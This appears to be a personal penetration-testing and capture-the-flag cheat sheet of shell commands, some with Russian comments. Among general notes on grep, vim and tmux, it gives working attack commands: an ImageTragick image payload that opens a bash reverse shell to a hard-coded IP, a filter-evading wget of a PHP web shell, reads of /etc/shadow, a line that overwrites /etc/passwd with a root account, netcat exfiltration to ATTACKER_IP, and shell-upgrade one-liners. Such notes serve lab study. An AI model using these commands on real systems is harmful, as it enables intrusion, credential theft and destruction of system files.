[back](../README.md)
#### scan rpc port
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
```
---
#### scan from 1 to 100 ports with nc
```sh
for i in {1..100};do nc $IP $i;echo "";done
```
---
#### CVE-2016–3714

```
cat > image.png << EOF
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.8.50.72/4444 0<&1 2>&1'
pop graphic-context
pop graphic-context
EOF
```
---

#### Read file:
```
xxd -r file.txt 
base64 /etc/shadow | base64 -d
ltrace # is a debugging utility in Linux, used to display the calls a userspace application makes to shared libraries.
echo "11 00 34 5f" | xxd -r -p #from bytes to letters

`l\s`: Equivalent to `ls`
`wget${IFS}http://10.8.50.72:8000/shell.php`

cat ./-

file */{.,}* #every type of file in folder
du -b -a | grep 1033 #size of file
sort data.txt | uniq -u #uniq lines

cat .download.dat | xxd -r -p #like strings
```

---
#### if command too long
```python
python3 py.py 10.10.13.118 "$(cat revshell.ps1)"
```
---
#### Decompress a gzip file:
```sh
gzip -d file.gz
```
---
#### Change file without vim or nano
```sh
cat > file << EOF 
....
EOF
```
---
#### php extensions to run revsell
```
.php
.php3
.php4
.php5
.phtml
```
---
#### broken png image
```
xxd thm.jpg | head
printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1
```
---
#### NFS share
```
showmount -e $IP
mkdir tmp/
sudo mount -t nfs 10.10.104.64: tmp
tree tmp
```
#### if 2049 port is open (mount)
```
showmount -e $IP
mount -t nfs $IP:/mnt/backups /mnt/loot
```
#### socat if open port
```python
./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
```

#### create new user in /etc/passwd with root

```
echo "user:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash" > /etc/passwd
```
---
#### File Transfer on `Netcat`

1. To download a file on the remote shell:

```nc
nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
```

2. To receive the file on the attacker machine:

```nc
nc -l ATTACKER_PORT > [output_file_path]
```

---
#### Transfer files using `scp`:

```
scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
scp -i id_rsa user@$IP:/home/willow/user.jpg . 
```
#### fix PATH in old ubuntu
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
#### mount
```sh
sudo apt install nfs-common
showmount -e $IP
sudo mkdir /mnt/nfs                                                              sudo mount -t nfs $IP:/var/failsafe /mnt/nfs 
```

#### grep
```sh
locate seclist | grep <what>
grep -Rwi "text"             # Recursively search for lines
grep -n                      # show numbers of lines
grep -i                      # do not care abuot regex
grep -c                      # how many times
grep linux * -r              # recursive  in all files
# точка - это любой символ, -f чтоб точка не считалась любым символом
-v '^#'                      # begins with
'^$'                         # пустые строки
-e '^(#|$)'                  # начинается или с # или с $(пустая строка)
grep -e 'colou?r'            # ? makes preveous character optional (то есть и может стоять и нет)
grep -w 'root'               # only word root, not asdrootas
\grep                        # unalias
-A5                          # five line after the math
-B5                          # before
-C5                          # before and after
-e '[0-9]{5,6}/tcp' file.txt # от 5 до 6 цифр от 0 до 9
-E '[0-9]$'                  # number at the end of line
-E '\s*'                     # space or tab 
+                            # one and more chars
```

---
#### ssh
```
ssh-keygen -t rsa -q -f "$HOME/.ssh/id_rsa" -N ""
```
#### ftp
```
ftp -A $IP #connect anon

prompt off
mget * #download all files
```
#### vim
```vim
Shift+H     # Move cursor to the top of the screen.
Shift+M     # Move cursor to the middle of the screen.
Shift+L     # Move cursor to the bottom of the screen.
gj          # Move one line down if text is within one line.
g0          # Move cursor to the start of the current line.
dk          # Delete current line and the line above it.
gq q        # Format selected text into a single block of multiple lines (VAPGQ).
J           # Join lines together (opposite of GQ).
gj          # Join lines without spaces (opposite of J).
gu u        # Convert to lowercase.
gU U        # Convert to uppercase.
~           # Toggle case of current character.
g~ ~        # Toggle case of all characters in the current line.
gf          # Open the file whose name is under the cursor, '^' to go back.
gv          # Return to the previous selection after visual mode.
```
#### tmux
```
ctrl b d # сохранить сессию и выйти из нее
cb p     # previous window
cb n     # next window
cb ,     # rename window
cb c     # create window
cb w     # list windows
tmux new -s [name_of_new_window]
cb :set -g mouse on
```
#### magic numbers
png
```
89504E470D0A1A0A
```
gif
```
GIF87a    474946383761
GIF89a    474946383961
```

#### mv multiple files
```
mv -t DESTINATION file1 file2 file3
```

---

#### run shell as other user
```
sudo -u user bash
```
---

#### shells
```
SHELL=/bin/bash script -q /dev/null
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
---
